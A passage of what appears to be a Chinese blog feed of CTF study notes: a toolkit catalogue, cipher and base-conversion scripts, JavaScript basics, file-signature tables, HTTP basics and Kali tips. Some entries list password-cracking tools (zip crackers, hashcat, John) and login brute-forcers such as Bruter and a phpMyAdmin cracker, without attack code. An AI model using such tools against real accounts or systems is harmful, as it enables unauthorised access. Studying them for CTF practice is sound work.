        <content type="html"><![CDATA[<ul><li><a href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">暴力破解</a></li><li><a href="#%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E9%87%8C%E5%8F%AB%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8">文本处理（文件里叫“文本编辑器”）</a></li><li><a href="#%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81">编码解码</a></li><li><a href="#%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7">爆破工具</a></li><li><a href="#%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7">密码工具</a></li></ul><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p><img src="/images/1-1.png"></p><ol><li>Ziperello：暴力破解zip文件密码&#x2F;字典&#x2F;模板，但没有字典只能破解六位密码</li><li>pkcrck不知道为什么电脑不能打开可能是win32版本所以打不开，但网上没找到其他版本的（待）</li><li>ARCHPR：暴力破解&#x2F;字典&#x2F;掩码（不确定的地方打上？就行）</li></ol><hr><h2 id="文本处理（文件里叫“文本编辑器”）"><a href="#文本处理（文件里叫“文本编辑器”）" class="headerlink" title="文本处理（文件里叫“文本编辑器”）"></a>文本处理（文件里叫“文本编辑器”）</h2><p><img src="/images/1-2-1.png"></p><ol><li>一个常见的010，我加了一个winhex（本来自己电脑的加进去了）</li></ol><hr><h2 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h2><p><img src="/images/1-3-1.png"></p><ol><li>因式分解（怎么用不清楚，作用不大先跳过，不敢删，放着</li><li>CyberChef：解码编码插件，有搜索功能</li><li>RSATool：网上没找到，遇到题目再说</li><li>Converter：功能有点鸡肋，尝试一个题目，直接卡死了</li><li>CTFcrack：额离谱旧电脑显示皮下是stegsolve，实则是解码工具（后续再补充</li><li>与佛论禅（字面意思）</li><li>Base64（字面意思）</li><li>随波逐流（编码解码好东西）<br><img src="/images/suibo.png"></li><li>AZdecrypt：Z340黄道十二宫密码破解软件<br>使用：python移位+软件左框输入解密</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">%,,@*&gt;@?==%88%5</span></span><br><span class="line"><span class="string">,@%#@@90-7$^=*@</span></span><br><span class="line"><span class="string">17,(&gt;()1@##-\$40</span></span><br><span class="line"><span class="string">~,*6?#%#8#=75+1</span></span><br><span class="line"><span class="string">(*@*1%#&gt;,0@5)%?</span></span><br><span class="line"><span class="string">%*^=)&amp;&gt;=1%,+7&amp;#</span></span><br><span class="line"><span class="string">8681(+8*@@(,@@@</span></span><br><span class="line"><span class="string">#*=#\$3*#%,#%%,3</span></span><br><span class="line"><span class="string">,*+7,7+@===+)61</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">s = s.strip()</span><br><span class="line"> </span><br><span class="line">arr = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">    tmp_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(arr):</span><br><span class="line">        i = (<span class="number">2</span> * index + n) % <span class="number">15</span> - <span class="number">1</span></span><br><span class="line">        tmp_s += value[i]</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span>(tmp_s)</span><br></pre></td></tr></table></figure><ol start="10"><li>hashcat：cmd命令工具，原按钮无用，我加了exe文件按钮但具体用法是：##右键打开文件位置然后打开此处cmd##kali中自带！！！<br><a href="https://cloud.tencent.com/developer/article/2187201">https://cloud.tencent.com/developer/article/2187201</a><br>嗯，不是我现在用得上的高级东西，先浅放个使用方法网页，网页打不开去image文件夹找图片。<br><a href="https://www.cnblogs.com/Junglezt/p/16044372.html">https://www.cnblogs.com/Junglezt/p/16044372.html</a><br>后面搜索到的使用文档</li><li>CTF-Tools（原按钮失效，已删除重新添加exe文件可使用）<br><img src="/images/CTF-Tools.png"></li><li>破空（原来是无效按钮旧版3.0的，看到有3.3的（申请QQ群ing未替换））<blockquote><p>3.3功能：<br>1）查找到flag其他模式可以右键转换（结果去哪了还不清楚）<br>2）文件可以直接拖进去<br>3.3注意：<br>1）关键字编码即将flag的base64编码、16进制一起搜索，但只对字符格式有效；<br>2）网页查找智能用正则匹配</p></blockquote></li><li>CQR：二维码常见工具</li><li>Hash计算（字面意思吧。。遇到题目再说）</li><li>CaptfEncoder（原按钮无效，已删除重新添加exe文件可使用）：解码编码，有搜索功能</li><li>Apocalypso（原按钮无效，已删除重新添加exe文件可使用）：<br><img src="/images/A.png"></li><li>RSATool2v110（原按钮无效，已删除重新添加exe文件可使用）：<br>P、Q、R、D、E 分别就是 RSA 算法中的 p、q、N、d、e，右上角选择进制，注意：e 只有十六进制可用，左下角有一个 Factor N 的按钮，这是分解 N 的意思，点一下，会自动开始分解因数，得到 P、Q，Calc.D是计算按钮</li><li>MixedCS：DES加密软件</li><li>5bit编码：字面意思</li><li>SSLEye：编码解码工具，没有搜索功能<br><img src="/images/SSL.png"></li><li>在线。。。：字面意思</li><li>Ookbrainfuck：两种编码在线网站<br>Ook! has only three distinct syntax elements:<br>Ook.   &#x2F;   Ook?   &#x2F;   Ook!<br>Brainfuck语言用&gt; &lt; + - . , [ ]八种符号来替换C语言的各种语法和命令</li><li>brainfuck：字面意思吧但网页看不懂怎么操作</li><li>摩斯密码：好像打不开。。</li><li>quip词频分析：Quipqiup 是一个快速且自动化的密码求解器 by 埃德温 奥尔森。它可以解决常见的简单替换密码在报纸上，包括像 Cryptoquips 这样的谜题（在哪个词中边界被保留）。（遇到题目再说咯）</li><li>Playfair：（字面意思Playfair解码网站）</li><li>hillcipher：同上</li><li>熊说。。。：美化网站。。不知道怎么混进来的</li><li>malbolge：Malbolge 由 Ben Olmstead 于 1998 年发明，是一种深奥的编程语言，旨在尽可能难以编程。事实就是这样：-）（什么鬼东西哦编程在线网页？</li><li>Wingdings：将常规英文文本转换为可复制和粘贴的 Wingdings 文本</li><li>双hex：（字面意思two hex解码网站）</li><li>维吉利亚：<br><img src="/images/V.png"></li><li>切鲁：（混进来的鬼东西？</li><li>0宽1、0宽2、emoji-aes：打不开</li></ol><hr><h2 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h2><p><img src="/images/1-4.png"></p><ol><li>Bruter：爆破密码，ip+user用户名+dictionary</li><li>John：使用方式看下面网址，打不开看images文件夹，kali自带<br><a href="https://www.cnblogs.com/Junglezt/p/16048189.html">https://www.cnblogs.com/Junglezt/p/16048189.html</a></li><li>phpMyAdmin：字面意思暴力破解用户名密码</li><li>t00ls：看不懂搜不到跳过</li><li>。。。都看不懂，遇到题目再说好了</li></ol><hr><h2 id="密码工具"><a href="#密码工具" class="headerlink" title="密码工具"></a>密码工具</h2><p>（太多了bushi先放着）</p><p><img src="/images/1-5.png"><br><img src="/images/1-6.png"><br><img src="/images/1-7.png"><br><img src="/images/1-8.png"><br><img src="/images/1-9.png"><br><img src="/images/1-10.png"><br><img src="/images/1-11.png"><br><img src="/images/1-12.png"><br><img src="/images/1-13.png"><br><img src="/images/1-14.png"><br><img src="/images/1-15.png"><br><img src="/images/1-16.png"><br><img src="/images/1-17.png"><br><img src="/images/1-18.png"><br><img src="/images/1-19.png"><br><img src="/images/1-20.png"><br><img src="/images/1-21.png"><br><img src="/images/1-22.png"><br><img src="/images/1-23.png"><br><img src="/images/1-24.png"><br><img src="/images/1-25.png"><br><img src="/images/1-26.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python代码和bat自动化存档</title>
      <link href="/2025/08/17/python%E4%BB%A3%E7%A0%81%E5%92%8Cbat%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AD%98%E6%A1%A3/"/>
      <url>/2025/08/17/python%E4%BB%A3%E7%A0%81%E5%92%8Cbat%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AD%98%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<ol><li><p>bat文件<br>@echo off<br>python “python文件绝对路径\文件名.py” &amp; pause<br>注意：<br>1）另存为时编码保存为ANSI，防止乱码<br>2）引号必须是英文引号</p></li><li><p>实现进制与字符串转换的python代码</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">astart = input(&#x27;输入待处理数字或字符串：&#x27;)</span><br><span class="line">#a = int(astart)</span><br><span class="line">bs = input(&#x27;输入选择：1=数字2=字符串&#x27;)</span><br><span class="line">b = int(bs)</span><br><span class="line">if b == 1:</span><br><span class="line">    c = int(input(&#x27;数字是1=二进制2=十进制3=十六进制4=八进制&#x27;))</span><br><span class="line">    if  c == 1:</span><br><span class="line">        a10 = int(astart,2)</span><br><span class="line">        print(&#x27;转为十进制为：&#x27;,a10,&#x27;\n转为八进制0o为：&#x27;,oct(a10),&#x27;\n转为十六进制0xc为：&#x27;,hex(a10))</span><br><span class="line">    elif c == 2:</span><br><span class="line">        a = int(astart)</span><br><span class="line">        a10 = a</span><br><span class="line">        print(&#x27;转为二进制0b为：&#x27;,bin(a),&#x27;\n转为八进制0o为：&#x27;,oct(a),&#x27;\n转为十六进制0xc为：&#x27;,hex(a))</span><br><span class="line">    elif c == 3:</span><br><span class="line">        a10 = int(astart,16)</span><br><span class="line">        print(&#x27;转为十进制为：&#x27;,a10,&#x27;\n转为八进制0o为：&#x27;,oct(a10),&#x27;\n转为十六进制0xc为：&#x27;,hex(a10))</span><br><span class="line">    elif c == 4:</span><br><span class="line">        a10 = int(astart,8)</span><br><span class="line">        print(&#x27;转为十进制为：&#x27;,a10,&#x27;\n转为八进制0o为：&#x27;,oct(a10),&#x27;\n转为十六进制0xc为：&#x27;,hex(a10))</span><br><span class="line">    by = a10.to_bytes((a10.bit_length() + 7) // 8, &#x27;big&#x27;)   # 大端</span><br><span class="line">    print(&#x27;转为字符串为：&#x27;,by)</span><br><span class="line">elif b == 2:</span><br><span class="line">    a2 = astart.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    a2_10 = int.from_bytes(a2,&#x27;big&#x27;)</span><br><span class="line">    print(&#x27;转为二进制0b为：&#x27;,bin(a2_10),&#x27;\n转为八进制0o为：&#x27;,oct(a2_10),&#x27;\n转为十六进制0xc为：&#x27;,hex(a2_10),&#x27;\n转为十进制为：&#x27;,a2_10)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js 笔记</title>
      <link href="/2025/08/17/js-%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/08/17/js-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>原先运行环境是网页，现在node能够模仿，所以本地运行需要下载node。<br>具体（在VScode中编辑）：<br>1新建html文件，！+Tab获得：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 &gt;Hello World!&lt;/h1&gt;</span><br><span class="line">    &lt;script src=&quot;文件名.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><body>处需要手动编辑：1）h1+Tab获得<h1 ></h1>标签，中间可编辑；2）script+Tab获得<script></script>标签，中间可编辑，但正常使用引用.js文件方式编辑，具体如上述代码。<p>2 javascript语法粗略学习</p><ol><li>打印函数</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(&#x27;hello world&#x27;);</span><br></pre></td></tr></table></figure><ol start="2"><li><p>变量：var全局变量,let可修改,const不可修改赋值对象</p></li><li><p>原生数据类型：string,number包括小数,boolean,null,undefined</p></li></ol><ol><li>undefined定义方法不是const而是：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let 变量名</span><br></pre></td></tr></table></figure><ol start="2"><li>类型检验方式：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(typeof 变量名);</span><br></pre></td></tr></table></figure><p>此时null输出object<br>3) string<br>1、打印方法（新&#x2F;旧）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(&#x27;123&#x27;+变量名);</span><br><span class="line">//模板字符串 新方法：</span><br><span class="line">const hello = `Myname is $&#123;变量名&#125;`; </span><br><span class="line">console.log(hello);</span><br></pre></td></tr></table></figure><p>2、内置方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//变量名.length</span><br><span class="line">//.toUpperCase()/.toLowerCase大小写</span><br><span class="line">//.substring(a,b)截取[a,b)；并且可以后面叠加（如大小写）</span><br><span class="line">//.split(&#x27;&#x27;)分割成数组 最小以字母为单位 ‘’内传入分割依据</span><br></pre></td></tr></table></figure><ol start="4"><li>数组</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1）构造方法</span><br><span class="line">//const 变量名 = new Array(1,2,3,4);</span><br><span class="line">//const 变量名 = [1,&#x27;1&#x27;,true];</span><br><span class="line">//2）索引</span><br><span class="line">//数组名[1]可直接获取/赋值</span><br><span class="line">//数组名.unshift(&#x27;dhkaju&#x27;)在最后加入数组</span><br><span class="line">//数组名.pop()删除最后</span><br><span class="line">//判断是否为数组Array.isArray(数组名)为bool值</span><br><span class="line">//数组名.indexOf(&#x27;数组内容&#x27;)为数组内容索引号</span><br></pre></td></tr></table></figure><ol start="5"><li>对象</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//const 对象名 = &#123;&#125;</span><br><span class="line">//属性可以TAB明确级别</span><br><span class="line">//调用</span><br><span class="line">//      对象名.属性名1，属性名2</span><br><span class="line">//      对象名.属性名1，属性名1.1</span><br><span class="line">//      对象名.属性名1[1]</span><br><span class="line">//剩余先跳过未学习</span><br></pre></td></tr></table></figure><ol start="6"><li>if</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (条件句)&#123;</span><br><span class="line">    内容</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    内容</span><br><span class="line">&#125;</span><br><span class="line">//条件句：===同时判断类型是否相同，==只判断内容</span><br><span class="line">//      ||或 &amp;&amp;且</span><br></pre></td></tr></table></figure><ol start="7"><li>三目运算符</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const color = x &gt; 10 ? &#x27;red&#x27; : &#x27;blue&#x27;;</span><br><span class="line">//x &gt; 10时color = &#x27;red&#x27;反之&#x27;blue&#x27;</span><br></pre></td></tr></table></figure><ol start="8"><li>swith条件语句</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch(color)&#123;</span><br><span class="line">    case &#x27;red&#x27;:</span><br><span class="line">        break;</span><br><span class="line">    default &#x27;blue&#x27;:</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="9"><li>for while循环</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (let i = 0;i &lt;= 10; i++)&#123;</span><br><span class="line">    内容</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">let i = 0</span><br><span class="line">while(i &lt; 10)&#123;</span><br><span class="line">    内容</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十六进制文件头尾特征</title>
      <link href="/2025/08/16/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4%E5%B0%BE%E7%89%B9%E5%BE%81/"/>
      <url>/2025/08/16/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4%E5%B0%BE%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<p>##JPEG 图像文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FFD8 FFE0 0010 4A46 4946 0001 0101 0047 ...</span><br></pre></td></tr></table></figure><p>FFD8 表示 JPEG 文件的开始，FFE0 代表应用程序特定标记，4A46 4946 表示 “JFIF” 标识。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... FFD9</span><br></pre></td></tr></table></figure><p>##PNG 图像文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8950 4E47 0D0A 1A0A ...</span><br></pre></td></tr></table></figure><p>PNG 文件的标准签名，其中 8950 4E47 对应 ASCII 编码的 %PNG。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... 0000 0000 4945 4E44 AE42 6082</span><br></pre></td></tr></table></figure><p>4945 4E44 对应 ASCII 编码的 IEND，AE42 6082 是 CRC 校验码。</p><p>##PDF 文档<br>以 %PDF 开头，具体的十六进制表示如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2550 4446 2D31 2E3X ...</span><br></pre></td></tr></table></figure><p>2550 4446 对应 ASCII 编码的 %PDF，2D31 2E3X 代表 PDF 的版本号。<br>文件尾通常包含 %%EOF 标记，具体的十六进制表示如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... 2525 454F 46</span><br></pre></td></tr></table></figure><p>2525 454F 46 对应 ASCII 编码的 %%EOF。</p><p>##DOC 文件（Microsoft Word 97-2003）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D0 CF 11 E0 A1 B1 1A E1 ...</span><br></pre></td></tr></table></figure><p>这个签名是 Microsoft 复合文件二进制格式（Compound File Binary Format, CFBF）的标志，常用于旧版 Microsoft Office 文档。<br>文件尾没有固定的模式，但通常包含结束标记，如 00 00 00 00。</p><p>##DOCX 文件&#x2F;ZIP文件（Microsoft Word 2007+）<br>DOCX 文件是基于 XML 的文件格式。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4B 03 04 ...</span><br></pre></td></tr></table></figure><p>这个签名表示 ZIP 压缩文件格式，因为 DOCX 文件实际上是 ZIP 压缩的 XML 文件。<br>文件尾通常以 ZIP 文件的结束标记结束：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... 50 4B 05 06</span><br></pre></td></tr></table></figure><p>##TXT 文件<br>没有固定的文件头，因为只是纯文本文件，有些文本文件可能以特定的字符编码（如 UTF-8）开始：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EF BB BF ...</span><br></pre></td></tr></table></figure><p>这是 UTF-8 编码的字节顺序标记（BOM）。<br>通常没有固定的文件尾。</p><p>##MOV 视频文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 14 66 74 79 70 71 74 20 20 ...</span><br></pre></td></tr></table></figure><p>66 74 79 70 对应 ASCII 编码的 ftyp，表示文件类型。<br>文件尾没有固定的模式，但通常包含结束标记，如 6D 64 61 74（mdat）。</p><p>##MP4 视频文件<br>MP4 文件的文件头与 MOV 文件类似，也以 ftyp 开头，但后续字节可能有所不同：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 18 66 74 79 70 6D 70 34 32 ...</span><br></pre></td></tr></table></figure><p>6D 70 34 32 对应 ASCII 编码的 mp42，表示 MPEG-4 第2版。<br>文件尾没有固定的模式，但通常包含结束标记，如 6D 64 61 74（mdat）。</p><hr><p>©著作权归作者所有：来自51CTO博客作者陈锋爱吃菠萝的原创作品，请联系作者获取转载授权，否则将追究法律责任（联系中）<br>十六进制文件头和文件尾：文件取证和恢复的关键<br><a href="https://blog.51cto.com/u_15763679/11200825">https://blog.51cto.com/u_15763679/11200825</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf 碎片知识整理</title>
      <link href="/2025/08/16/ctf-%E7%A2%8E%E7%89%87%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
      <url>/2025/08/16/ctf-%E7%A2%8E%E7%89%87%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9">零碎知识点</a><ul><li><a href="#1-http%E8%AF%B7%E6%B1%82%E5%8C%85%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF">1. HTTP请求包（浏览器信息）</a></li><li><a href="#2-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3error-externally-managed-environment">2. 报错解决：error: externally-managed-environment</a></li><li><a href="#3-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3einvalid-opertion-install">3. 报错解决：E：invalid opertion install</a></li><li><a href="#4-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4kali%E8%BF%9B%E5%85%A5%E9%80%80%E5%87%BAroot%E5%91%BD%E4%BB%A4">4. 常用命令：【kali】进入退出root命令</a></li><li><a href="#5-%E9%9B%B6%E5%AE%BD%E9%9A%90%E5%86%99">5. 零宽隐写</a></li></ul></li></ul><h1 id="零碎知识点"><a href="#零碎知识点" class="headerlink" title="零碎知识点"></a>零碎知识点</h1><h2 id="1-HTTP请求包（浏览器信息）"><a href="#1-HTTP请求包（浏览器信息）" class="headerlink" title="1. HTTP请求包（浏览器信息）"></a>1. HTTP请求包（浏览器信息）</h2><p>我们先看看Request包的结构, Request包分为3部分，第一部分叫Request line（请求行）, 第二部分叫Request header（请求头）,第三部分是body（主体）。header和body之间有个空行，请求包的例子所示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET//请求行: 请求方法 请求URL HTTP协议/协议版本</span><br><span class="line">Host：//服务端的主机名</span><br><span class="line">User-Agent：//浏览器信息</span><br><span class="line">Accept：//客户端能接收的MIME</span><br><span class="line">Accept-Encoding：//是否支持流压缩</span><br><span class="line">Accept-Charset：//客户端字符编码集</span><br><span class="line">//空行,用于分割请求头和消息体</span><br><span class="line">//消息体,请求资源参数,例如POST传递的参数</span><br></pre></td></tr></table></figure><p>HTTP协议定义了很多与服务器交互的请求方法，最基本的有4种，分别是GET,POST,PUT,DELETE。一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，增，改，删4个操作。我们最常见的就是GET和POST了。GET一般用于获取&#x2F;查询资源信息，而POST一般用于更新资源信息。</p><p>GET和POST的区别:</p><blockquote><ol><li>我们可以看到GET请求消息体为空，POST请求带有消息体。</li><li>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name&#x3D;test1&amp;id&#x3D;123456。POST方法是把提交的数据放在HTTP包的body中。</li><li>GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制。</li><li>GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码</li></ol></blockquote><p>HTTP响应包（服务器信息）<br>我们再来看看HTTP的response包，他的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK//状态行</span><br><span class="line">Server: nginx/1.0.8//服务器使用的WEB软件名及版本</span><br><span class="line">Date:Date: Tue, 30 Oct 2012 04:14:25 GMT//发送时间</span><br><span class="line">Content-Type: text/html//服务器发送信息的类型</span><br><span class="line">Transfer-Encoding: chunked//表示发送HTTP包是分段发的</span><br><span class="line">Connection: keep-alive//保持连接状态</span><br><span class="line">Content-Length: 90//主体内容长度</span><br><span class="line">//空行 用来分割消息头和主体</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;... //消息体</span><br></pre></td></tr></table></figure><p>Response包中的第一行叫做状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。<br>状态码用来告诉HTTP客户端,HTTP服务器是否产生了预期的Response。<br>HTTP&#x2F;1.1协议中定义了5类状态码， 状态码由三位数字组成，第一个数字定义了响应的类别</p><blockquote><p>1XX 提示信息 - 表示请求已被成功接收，继续处理<br>2XX 成功 - 表示请求已被成功接收，理解，接受<br>3XX 重定向 - 要完成请求必须进行更进一步的处理<br>4XX 客户端错误 - 请求有语法错误或请求无法实现<br>5XX 服务器端错误 - 服务器未能实现合法的请求<br>————————————————<br>版权声明：本文为CSDN博主「hespecial」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/m0_50376770/article/details/132438222">https://blog.csdn.net/m0_50376770/article/details/132438222</a></p></blockquote><h2 id="2-报错解决：error-externally-managed-environment"><a href="#2-报错解决：error-externally-managed-environment" class="headerlink" title="2. 报错解决：error: externally-managed-environment"></a>2. 报错解决：error: externally-managed-environment</h2><p>方法1：安装venv虚拟环境（网上推荐但失败）<br>方法2：安装pipx，成功但使用不便<br>方法3：强行避免报错<br>具体：<br>原来安装代码：pip install 对象名<br>现在安装代码：pip install –break-system-packages 对象名</p><h2 id="3-报错解决：E：invalid-opertion-install"><a href="#3-报错解决：E：invalid-opertion-install" class="headerlink" title="3. 报错解决：E：invalid opertion install"></a>3. 报错解决：E：invalid opertion install</h2><p>更换源代码：<br>sudo add-apt-repository main<br>sudo add-apt-repository universe<br>sudo add-apt-repository restricted<br>sudo add-apt-repository multiverse<br>sudo apt-get update</p><h2 id="4-常用命令：【kali】进入退出root命令"><a href="#4-常用命令：【kali】进入退出root命令" class="headerlink" title="4. 常用命令：【kali】进入退出root命令"></a>4. 常用命令：【kali】进入退出root命令</h2><p>设置root密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p>进入root：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p>退出root：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su 用户名</span><br></pre></td></tr></table></figure><h2 id="5-零宽隐写"><a href="#5-零宽隐写" class="headerlink" title="5. 零宽隐写"></a>5. 零宽隐写</h2><p><a href="https://tool.bfw.wiki/tool/1695021695027599.html">https://tool.bfw.wiki/tool/1695021695027599.html</a><br>注意：用ctrl+A复制</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如有侵权，私联方式：luoyinhui@protonmail.com</title>
      <link href="/2025/08/14/%E5%A6%82%E6%9C%89%E4%BE%B5%E6%9D%83%EF%BC%8C%E7%A7%81%E8%81%94%E6%96%B9%E5%BC%8F%EF%BC%9Aluoyinhui-protonmail-com/"/>
      <url>/2025/08/14/%E5%A6%82%E6%9C%89%E4%BE%B5%E6%9D%83%EF%BC%8C%E7%A7%81%E8%81%94%E6%96%B9%E5%BC%8F%EF%BC%9Aluoyinhui-protonmail-com/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>misc 笔记</title>
      <link href="/2025/08/13/misc-%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/08/13/misc-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>目录：</p><ul><li><a href="#sstv">sstv</a></li></ul><h2 id="sstv"><a href="#sstv" class="headerlink" title="sstv"></a>sstv</h2><ol><li>下载方法：pip install sstv<br>使用方法：<br>wav音频文件放到sstv根目录（C:\Windows\System32\sstv），打开cmd，输入</li></ol><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> sstv</span><br><span class="line">sstv -d 文件名.wav -o result.png#输出图片名</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>RX-SSTV解码软件<br>下载地址：<a href="https://www.qsl.net/on6mu/rxsstv.htm">https://www.qsl.net/on6mu/rxsstv.htm</a><br>虚拟声卡e2eSoft<br>由于SSTV工具是根据音频传递图片信息，正常解法需要一台设备播放一台设备收音，所以需要一个虚拟声卡，还能避免杂音的干扰。<br>下载地址：<a href="https://www.e2esoft.cn/vsc/">https://www.e2esoft.cn/vsc/</a><br><img src="/images/sstv.jpeg"></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件下载方法存档</title>
      <link href="/2025/08/12/%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%E5%AD%98%E6%A1%A3/"/>
      <url>/2025/08/12/%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%E5%AD%98%E6%A1%A3/</url>
      
